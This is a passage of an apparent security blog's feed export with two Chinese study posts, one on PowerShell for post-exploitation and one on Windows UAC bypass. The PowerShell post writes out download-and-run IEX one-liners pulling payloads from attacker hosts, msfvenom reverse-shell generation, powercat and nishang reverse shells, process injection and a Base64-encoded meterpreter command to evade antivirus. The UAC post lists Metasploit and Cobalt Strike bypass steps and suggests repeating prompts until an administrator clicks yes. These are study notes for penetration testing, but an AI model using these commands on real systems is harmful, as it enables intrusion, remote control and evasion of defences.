    <summary type="html">&lt;h1 id=&quot;Wireshark&quot;&gt;&lt;a href=&quot;#Wireshark&quot; class=&quot;headerlink&quot; title=&quot;Wireshark&quot;&gt;&lt;/a&gt;Wireshark&lt;/h1&gt;&lt;h2 id=&quot;文件导出功能&quot;&gt;&lt;a href=&quot;#文件导出功能&quot; class=&quot;head</summary>
      
    
    
    
    <category term="CTF-流量分析" scheme="http://s1eady.top/categories/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CTF-流量分析" scheme="http://s1eady.top/tags/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>内网学习--Powershell使用</title>
    <link href="http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/"/>
    <id>http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/</id>
    <published>2020-11-20T20:14:26.000Z</published>
    <updated>2020-11-21T08:14:57.442Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><h4 id="Powershell基本概念"><a href="#Powershell基本概念" class="headerlink" title="Powershell基本概念"></a>Powershell基本概念</h4><p>Windows PowerShell是一种命令行外壳程序和脚本环境，可以看作是命令行提示符cmd.exe的扩展，其使命令行用户和脚本编写者可以利用.NET Framework的强大功能。只要可以在一台计算机上运行代码，就可以将PowerShell脚本文件（.ps1）下载到磁盘中执行（甚至无须将脚本文件写到磁盘中）。</p><h4 id="Powershell特点"><a href="#Powershell特点" class="headerlink" title="Powershell特点"></a>Powershell特点</h4><ul><li>在Windows 7以上版本是默认安装的；</li><li>脚本可以在内存中运行，不需要写入磁盘；</li><li>几乎不会触发杀毒软件；</li><li>可远程执行；</li><li>目前很多工具都是局域PowerShell开发的；</li><li>使Windows脚本的执行更为容易；</li><li>cmd.exe的运行通常会被阻止，但PowerShell的运行通常不会被阻止；</li><li>可用于管理活动目录；</li></ul><h4 id="Powershell执行策略"><a href="#Powershell执行策略" class="headerlink" title="Powershell执行策略"></a>Powershell执行策略</h4><p>为了防止使用者运行恶意脚本，PowerShell提供了一个执行策略。在默认情况下，这个执行策略被设置为“不能运行”。</p><p>使用如下的cmdlet命令查询当前的执行策略：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure><h5 id="常见的执行策略值"><a href="#常见的执行策略值" class="headerlink" title="常见的执行策略值"></a>常见的执行策略值</h5><ul><li>Restricted：脚本不能运行（默认设置）；</li><li>RemoteSigned：在本地创建的脚本可以运行，但不能运行网上下载的脚本（拥有数字证书的除外）；</li><li>AllSigned：仅当脚本由受信任的发布者签名时才能运行；</li><li>Unrestricted：允许所有脚本运行；</li></ul><p>使用下面的cmdlet命令设置PowerShell的执行策略：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; Set-ExecutionPolicy &lt;policy name&gt;</span><br></pre></td></tr></table></figure><h5 id="绕过执行策略"><a href="#绕过执行策略" class="headerlink" title="绕过执行策略"></a>绕过执行策略</h5><p>PowerSploit是一款基于PowerShell的后渗透测试框架，其中包含很多PowerShell脚本，主要用于渗透测试中的信息收集、权限提升、权限维持。</p><p>想运行PowerShell脚本，必须使用管理员权限将执行策略从Restricted改为Unrestricted。</p><h6 id="Bypass本地权限并执行"><a href="#Bypass本地权限并执行" class="headerlink" title="Bypass本地权限并执行"></a>Bypass本地权限并执行</h6><ul><li><p>将PowerShell脚本文件test.ps1上传至目标服务器。在命令行环境下，执行如下命令，绕过安全策略，在目标服务器本地执行该脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File test.ps1</span><br></pre></td></tr></table></figure></li><li><p>用iex下载远程PS1脚本绕过权限执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString(&quot;xxx.ps1&quot;);[Parameters]</span><br></pre></td></tr></table></figure></li></ul><h4 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h4><h5 id="PowerSploit基本概念"><a href="#PowerSploit基本概念" class="headerlink" title="PowerSploit基本概念"></a>PowerSploit基本概念</h5><p>PowerSploit是GitHub上面的一个安全项目，上面有很多powershell攻击脚本，它们主要被用来渗透中的信息侦察、权限提升、权限维持。</p><h5 id="PowerSploit特点"><a href="#PowerSploit特点" class="headerlink" title="PowerSploit特点"></a>PowerSploit特点</h5><p>1.代码运行在内存中可以不去接触磁盘</p><p>2.从另一个系统中下载代码并执行</p><p>3.很多安全产品并不能监测到powershell的活动</p><p>4.cmd.exe通常被阻止运行，但是powershell不会</p><h5 id="PowerSploit下载"><a href="#PowerSploit下载" class="headerlink" title="PowerSploit下载"></a>PowerSploit下载</h5><p>Github下载之后，我们放到攻击机的web目录，以便于在目标机器的powershell中下载对应的利用脚本。</p><h5 id="PowerSploit模块"><a href="#PowerSploit模块" class="headerlink" title="PowerSploit模块"></a>PowerSploit模块</h5><ul><li><p>CodeExecution模块–Invoke-Shellcode脚本</p><p>   直接执行shellcode反弹meterpreter shell</p><ul><li><p>利用msfvenom生成一个反弹木马，以供invoke-shellcode注入。</p></li><li><p>调用目标机的powershell进行IEX远程下载invoke-shellcode脚本和生成的木马。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSp</span><br><span class="line">loit&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1&quot;)</span><br></pre></td></tr></table></figure></li><li><p>下载生成好的木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;code&quot;)</span><br></pre></td></tr></table></figure></li><li><p>kali设置msf监听</p></li><li><p>在powershell中调用invoke-shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; Invoke-Shellcode -Shellcode $buf -Force</span><br></pre></td></tr></table></figure></li></ul><p>指定进程注入shellcode反弹meterpreter shell</p><ul><li><p>下载ps脚本和木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSp</span><br><span class="line">loit&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1&quot;)</span><br><span class="line">PS C:\Users\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;code&quot;)</span><br></pre></td></tr></table></figure></li><li><p>选择注入的进程—直接选择系统进程，因为如果我们的进程关闭，我们的会话也会关闭，系统进程一般不回被关闭。<br>常见系统进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explorer进程(Windows程序管理器或者文件资源管理器)</span><br></pre></td></tr></table></figure></li><li><p>Get-Process或者ps命令查看当前所有的进程。</p><p><code>ps -Name explorer</code>查看某一个进程的PID。</p></li><li><p>注入id为1228的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Shellcode -Shellcode $buf -ProcessID 1228 -Force调用invoke-dllinjection将DLL注入到进程中。</span><br></pre></td></tr></table></figure></li></ul></li><li><p>CodeExecution模块–调用invoke-dllinjection将DLL注入到进程中</p><ul><li><p>msf生成dll文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.190.141 lport&#x3D;4444 -f dll -o &#x2F;var&#x2F;www&#x2F;html&#x2F;code.dll</span><br></pre></td></tr></table></figure></li><li><p>Powershel 下载dllinjection文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSploit&#x2F;CodeExecutio</span><br><span class="line">n&#x2F;Invoke-DllInjection.ps1&quot;)</span><br></pre></td></tr></table></figure></li><li><p>将dll注入到某一个进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; Invoke-DllInjection -Dll .\code.dll -ProcessID 2700</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="powershell反弹shell常见方式"><a href="#powershell反弹shell常见方式" class="headerlink" title="powershell反弹shell常见方式"></a>powershell反弹shell常见方式</h4><ul><li><p>powercat反弹shell </p><p>powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat 。</p><ul><li><p>下载脚本文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString (&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);</span><br></pre></td></tr></table></figure></li><li><p>反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 192.168.159.134 -p 6666 -e cmd</span><br></pre></td></tr></table></figure></li></ul></li><li><p>nishang反弹shell </p><p>Nishang是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</p><ul><li><p>反弹TCPshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com &#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666</span><br></pre></td></tr></table></figure></li><li><p>自定义powershell函数反弹shell </p></li><li><p>反弹UDPshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.134&#x2F;nishang&#x2F;Shells&#x2F;Invoke-PowerShellUdp.ps1&#39;); Invoke-PowerShellUdp -Reverse -IPAddress 192.168.159.134 -port 53</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="使用Base64对PowerShell命令进行编码"><a href="#使用Base64对PowerShell命令进行编码" class="headerlink" title="使用Base64对PowerShell命令进行编码"></a>使用Base64对PowerShell命令进行编码</h4><p>使用Base64编码PowerShell命令可以起到混淆和压缩代码的作用，避免一些特殊字符导致脚本被杀毒软件所查杀。</p><p>使用一个Python脚本文件<a href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py">ps_encoder.py</a>，其使用Base64编码封装的PowerShell命令包，其目的是混淆和压缩代码。</p><ul><li><p>将payload输入到文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# echo &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;cheetz&#x2F;PowerSploit&#x2F;master&#x2F;CodeExecution&#x2F;Invoke--Shellcode.ps1&#39;); Invoke-Shellcode -Payload windows&#x2F;meterpreter&#x2F;reverse_https -Lhost 192.168.10.137 -Lport 666 -Force&quot; &gt;raw.txt</span><br></pre></td></tr></table></figure></li><li><p>使用脚本对其编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# python ps_encoder.py -s raw.txt</span><br><span class="line">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop#</span><br></pre></td></tr></table></figure></li><li><p>在目标机器上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -NoP -NonI -Exec Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Powershell&quot;&gt;&lt;a href=&quot;#Powershell&quot; class=&quot;headerlink&quot; title=&quot;Powershell&quot;&gt;&lt;/a&gt;Powershell&lt;/h3&gt;&lt;h4 id=&quot;Powershell基本概念&quot;&gt;&lt;a href=&quot;#Powersh</summary>
      
    
    
    
    <category term="内网安全" scheme="http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网" scheme="http://s1eady.top/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>内网学习--UAC</title>
    <link href="http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/"/>
    <id>http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/</id>
    <published>2020-11-20T05:09:14.000Z</published>
    <updated>2020-11-21T08:16:11.187Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><h4 id="uac"><a href="#uac" class="headerlink" title="uac"></a>uac</h4><p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。</p><p>即在权限不够的情况下，访问系统磁盘的根目录、window目录、Program File目录，以及读、写系统登录数据库的程序等操作，都需要经过UAC认证。</p><p>注意</p><p>在其Windows Vista及更高版本操作系统中才会有UAC,Windows Vista是微软公司所研发的具有重大创新意义的一个版本，其内核版本号为Windows NT 6.0。</p><p>具体的windows版本可以查看<code>https://blog.csdn.net/jincf2011/article/details/6696133</code>。</p><p>如果要获取管理员权限，可以通过以下几条：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1，进程已经拥有管理权限控制；</span><br><span class="line">2，进程被用户允许通过管理员权限运行。</span><br></pre></td></tr></table></figure><h4 id="uac等级"><a href="#uac等级" class="headerlink" title="uac等级"></a>uac等级</h4><ul><li><p>始终通知：最严格的设置，每当程序需要使用高级别的权限的时候都会提示本地用户。</p></li><li><p>仅在程序试图更改我的计算机时通知我：这是UAC的默设置。当本地的Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别权限时，会提示本地用户。</p></li><li><p>仅在程序试图更改我的计算机时通知我(不降低桌面亮度)：与上一条设置的要求相同，但是在提示时用户不简单桌面的亮度。</p></li><li><p>从不提示：当用户为系统管理员时，所有程序都会以最高权限运行。</p></li></ul><h4 id="将会触发UAC授权的操作"><a href="#将会触发UAC授权的操作" class="headerlink" title="将会触发UAC授权的操作"></a>将会触发UAC授权的操作</h4><ol><li>配置Windows Update</li><li>增加或删除用户账户</li><li>改变用户的账户类型</li><li>改变UAC设置</li><li>安装ActiveX</li><li>安装或移除程序</li><li>安装设备驱动程序</li><li>设置家长控制</li><li>将文件移动或复制到Program Files或Windows目录</li><li>查看其他用户文件夹</li></ol><h4 id="查看当前用户的UAC等级"><a href="#查看当前用户的UAC等级" class="headerlink" title="查看当前用户的UAC等级"></a>查看当前用户的UAC等级</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WHOAMI &#x2F;Groups | FIND &quot;S-1-16&quot;</span><br><span class="line">Mandatory Label\Medium Mandatory Level Label S-1-16-8192</span><br></pre></td></tr></table></figure><h4 id="UAC-Bypass"><a href="#UAC-Bypass" class="headerlink" title="UAC Bypass"></a>UAC Bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1，白名单提权机制；如Wusa.exe Bypass UAC,infDefault.exe Bypass UAC,PkgMgr.exe Bypass UAC等。</span><br><span class="line">2，DLL 劫持；</span><br><span class="line">3，Windows 自身漏洞提权；</span><br><span class="line">4，远程注入；</span><br><span class="line">5，COM 接口技术。</span><br></pre></td></tr></table></figure><h4 id="Metasploit绕过UAC"><a href="#Metasploit绕过UAC" class="headerlink" title="Metasploit绕过UAC"></a>Metasploit绕过UAC</h4><h5 id="bypassuac模块"><a href="#bypassuac模块" class="headerlink" title="bypassuac模块"></a>bypassuac模块</h5><p>该模块将通过进程注入，利用受信任的发布者证书绕过Windows UAC。 它将为我们生成另一个关闭UAC的shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>使用bypassuac模块进行提权时，系统当前用户必须在管理员组。</li><li>用户账户控制程序UAC设置为默认，即”仅在程序试图更改我的计算机时通知我”。</li></ul><h5 id="RunAs模块"><a href="#RunAs模块" class="headerlink" title="RunAs模块"></a>RunAs模块</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;ask):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   FILENAME                    no        File name on disk</span><br><span class="line">   PATH                        no        Location on disk, %TEMP% used if not set</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><p>use exploit/windows/local/bypassuac_injection</p><p>set target  1         #设置目标系统类型，1是64位，0是32位</p></li><li><p>使用RunAs模块进行提权时，系统当前用户须在管理员组或者知道管理员的密码，用户账户控制程序UAC设置则没有要求。<br>使用RunAs模块进行提权时，会创建一个可执行文件，为了避免给杀毒软件查杀，该可执行文件（需进行免杀处理）的创建要使用EXE::Custom选项。</p><p>RunAs攻击的缺点是，程序企图修改计算机设置时，系统会对用户发出提醒。此警报可能会被管理人员认定为攻击。建议多次运行，系统多次对用户发出提醒后，对于缺乏安全意识或不厌其烦的管理人员会点击“是”，从而完成权限提升。</p></li></ul><h5 id="bypassuac-injection模块"><a href="#bypassuac-injection模块" class="headerlink" title="bypassuac_injection模块"></a>bypassuac_injection模块</h5><p>内存注入，bypassuac模块运行时会在目标机上创建多个文件，会被杀毒软件识别。exploit/windows/local/bypassuac_injection模块直接运行在内存中的反射DLL中，所以它不触碰硬盘，可以最大限度地降低被杀毒软件检测到的概率。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac_injection) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br></pre></td></tr></table></figure><ul><li>模块的使用需要选择正确的架构。</li></ul><h5 id="bypassuac-fodhelper模块"><a href="#bypassuac-fodhelper模块" class="headerlink" title="bypassuac_fodhelper模块"></a>bypassuac_fodhelper模块</h5><p>通过在当前用户配置单元下劫持注册表中的特殊键，并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_fodhelper</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_fodhelper) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_fodhelper) &gt; exploit</span><br></pre></td></tr></table></figure><h5 id="bypassuac-eventvwr模块"><a href="#bypassuac-eventvwr模块" class="headerlink" title="bypassuac_eventvwr模块"></a>bypassuac_eventvwr模块</h5><p>该模块通过在当前用户配置单元下劫持注册表中的特殊键，并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; exploit</span><br></pre></td></tr></table></figure><h5 id="bypassuac-comhijack模块"><a href="#bypassuac-comhijack模块" class="headerlink" title="bypassuac_comhijack模块"></a>bypassuac_comhijack模块</h5><p>模块将通过在HKCU配置单元中，创建COM处理程序注册表项来绕过Windows UAC。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_comhijack</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_comhijack) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_comhijack) &gt; exploit</span><br></pre></td></tr></table></figure><h4 id="Cobalt-Strike绕过UAC"><a href="#Cobalt-Strike绕过UAC" class="headerlink" title="Cobalt Strike绕过UAC"></a>Cobalt Strike绕过UAC</h4><p>当前用户不是管理员，攻击会失效。要检查当前用户是否在管理员组里，使用 <code>run whoami /groups</code> 命令，查看当前用户组，如果权限不够，需要先提权，至 <code>Administrator</code> 或者 <code>SYSTEM</code> 权限。然后再通过 <code>elevate</code> 命令使用这些 Bypass UAC 的模块。</p><p>右击一个beacon-&gt;执行-&gt;提权-&gt;选择监听器-&gt;选择exp<code>uac-token-duplication</code>。</p><p>也可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elevate uac-token-duplication beacon名字</span><br></pre></td></tr></table></figure><p>如果Bypass UAC 的 Beacon shell 是普通用户权限，我们需要在目标机器上点击弹出的对话框来确定是否更改UAC。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UAC&quot;&gt;&lt;a href=&quot;#UAC&quot; class=&quot;headerlink&quot; title=&quot;UAC&quot;&gt;&lt;/a&gt;UAC&lt;/h1&gt;&lt;h4 id=&quot;uac&quot;&gt;&lt;a href=&quot;#uac&quot; class=&quot;headerlink&quot; title=&quot;uac&quot;&gt;&lt;/a&gt;uac&lt;/h</summary>
      
    
    
    
    <category term="内网安全" scheme="http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网" scheme="http://s1eady.top/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>内网学习--Metasploit使用</title>
    <link href="http://s1eady.top/2020/11/12/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/11/12/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/</id>
